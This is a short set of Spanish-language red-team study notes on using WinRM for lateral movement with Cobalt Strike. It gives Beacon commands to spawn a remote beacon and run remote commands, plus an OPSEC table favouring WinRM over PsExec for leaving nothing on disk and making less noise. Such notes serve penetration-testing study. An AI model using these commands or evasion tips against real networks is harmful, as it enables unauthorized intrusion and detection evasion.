---
title: Windows Remote Management (WinRM)
tags: [ad, lateral-movement, winrm, cobalt-strike, beacon]
---

# Windows Remote Management (WinRM)

Administración remota via PowerShell. **Ejecuta payload desde memoria sin soltar nada en disco.**

## Desde Cobalt Strike

```
beacon> jump winrm64 lon-ws-1 smb
```

> [!important] Contexto de usuario
> Los Beacons ejecutados via WinRM corren en el contexto del usuario actual o del usuario suplantado — **no como SYSTEM** (a diferencia de PsExec).

## Ejecución remota con output

WinRM es el único `remote-exec` que devuelve output — útil para enumeración remota:

```
beacon> remote-exec winrm lon-ws-1 net sessions
```

## Ventaja OPSEC vs PsExec

| | PsExec | WinRM |
|--|--------|-------|
| Escribe en disco | Sí | No |
| Corre como | SYSTEM | Usuario actual |
| Contexto | Servicio | PowerShell Remoting |
| Ruido | Alto | Medio |

## Ver también
- [[PsExec]]
- [[Jump y Remote-Exec]]
